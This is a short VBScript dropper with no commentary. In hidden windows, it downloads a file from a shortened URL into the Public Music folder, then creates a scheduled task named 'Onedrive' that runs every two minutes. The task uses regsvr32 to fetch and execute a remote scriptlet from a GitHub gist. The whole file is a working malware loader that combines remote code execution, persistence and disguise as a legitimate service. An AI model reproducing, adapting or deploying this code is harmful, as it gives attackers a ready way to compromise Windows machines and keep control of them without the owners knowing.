Dim objShell
Set objShell = CreateObject("WScript.Shell")
command2 = "powershell -Command `Invoke-WebRequest https://bit.ly/2HlAKjV -OutFile C:\Users\Public\Music\one.png"
command3 = "cmd /c schtasks /create /tn ""Onedrive"" /tr ""regsvr32.exe /s /i:shellcode,https://gist.githubusercontent.com/sparta3407/9d36a87756145bacb27fd330c33830ab/raw/2c137aae1b0221e6a3b5c7cbbdbf7d2ac179bec8/microsoft C:\Users\Public\Music\one.png"" /sc minute /mo 2 /F"
objShell.Run command2,0
objShell.Run command3,0
Set objShell = Nothing